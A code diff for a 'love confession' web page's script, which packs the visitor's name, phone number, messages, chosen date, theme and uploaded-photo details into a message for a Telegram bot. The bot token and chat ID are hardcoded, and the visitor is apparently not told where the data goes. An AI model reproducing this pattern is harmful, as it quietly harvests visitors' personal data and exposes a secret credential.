@@ -250,6 +250,7 @@
         const customMessage = document.getElementById('customMessage').value;
         const romanticQuote = document.getElementById('romanticQuotes').value;
         const specialDate = document.getElementById('specialDate').value;
+        const photoUpload = document.getElementById('photoUpload');
         
         if (!userName.trim()) {
           alert('Please enter your name first! 🥺');
@@ -261,6 +262,13 @@
           return;
         }
         
+        // Get selected theme
+        const activeTheme = document.querySelector('.theme-btn.active')?.textContent || 'Not selected';
+        
+        // Check if photo was uploaded
+        const hasPhoto = photoUpload.files.length > 0;
+        const photoInfo = hasPhoto ? `📷 Photo: ${photoUpload.files[0].name} (${(photoUpload.files[0].size / 1024).toFixed(1)} KB)` : 'No photo uploaded';
+        
         // Track response for analytics
         const responseData = {
           name: userName,
@@ -269,6 +277,9 @@
           customMessage,
           romanticQuote,
           specialDate,
+          theme: activeTheme,
+          hasPhoto,
+          photoInfo,
           timestamp: new Date().toISOString()
         };
         
@@ -276,33 +287,33 @@
         responses.push(responseData);
         localStorage.setItem('loveResponses', JSON.stringify(responses));
         
-        // Create enhanced message with all collected data
-        let additionalContent = '';
-        if (customMessage.trim()) {
-          additionalContent += `\n💌 Personal Message: ${customMessage}`;
-        }
-        if (romanticQuote) {
-          additionalContent += `\n💝 Chosen Quote: ${romanticQuote}`;
-        }
-        if (specialDate) {
-          additionalContent += `\n🗓️ Special Date: ${specialDate}`;
-        }
-        
         const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
         const chatId = '6649936329';
-        // Create a beautifully designed Telegram message
+        
+        // Create comprehensive message for Yes responses with ALL data
         const message = answer === 'Yes' 
           ? `💝✨ LOVE CONFESSION ALERT! ✨💝
 
 🌹 ${userName} has responded to your love confession! 🌹
-📱 Contact: ${userPhone}
 
-💖 ANSWER: ${answer.toUpperCase()}! 💖
+═══ 📋 COMPLETE USER DETAILS ═══
+👤 Name: ${userName}
+📱 Phone: ${userPhone}
+💖 Response: ${answer.toUpperCase()}! 💖
+
+${customMessage.trim() ? `💌 Personal Love Message:
+"${customMessage}"
+` : ''}${romanticQuote ? `💝 Selected Romantic Quote:
+"${romanticQuote}"
+` : ''}${specialDate ? `🗓️ Special Date Chosen: ${new Date(specialDate).toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}
+` : ''}🎨 Theme Selected: ${activeTheme}
+${photoInfo}
 
 🥰 Someone special is ready to be yours! 
-💕 Time to celebrate love! 🎉${additionalContent}
+💕 Time to celebrate this beautiful love! 🎉
+✨ All your romantic efforts have paid off! ✨
 
-#LoveWins #Romance #ExpressingLove`
+#LoveWins #Romance #ExpressingLove #YesResponse`
           : `💔 Love Confession Response 💔
 
 🌸 ${userName} has responded to your love confession
@@ -311,7 +322,7 @@
 💙 ANSWER: ${answer} 💙
 
 💪 Don't give up! Love takes time and patience ⏰
-🌈 Keep spreading love and positivity! ✨${additionalContent}
+🌈 Keep spreading love and positivity! ✨
 
 #LoveJourney #StayPositive #ExpressingLove`;
         
@@ -359,11 +370,18 @@
         }
         
         // Store user data for potential later use
+        const activeTheme = document.querySelector('.theme-btn.active')?.textContent || 'Not selected';
+        const photoUpload = document.getElementById('photoUpload');
+        const hasPhoto = photoUpload.files.length > 0;
+        const photoInfo = hasPhoto ? `${photoUpload.files[0].name} (${(photoUpload.files[0].size / 1024).toFixed(1)} KB)` : 'No photo';
+        
         sessionStorage.setItem('userName', userName);
         sessionStorage.setItem('userPhone', userPhone);
         sessionStorage.setItem('customMessage', document.getElementById('customMessage').value);
         sessionStorage.setItem('romanticQuote', document.getElementById('romanticQuotes').value);
         sessionStorage.setItem('specialDate', document.getElementById('specialDate').value);
+        sessionStorage.setItem('selectedTheme', activeTheme);
+        sessionStorage.setItem('photoInfo', photoInfo);
         
         // Redirect to no1.html without sending message
         window.location.href = 'no1.html';
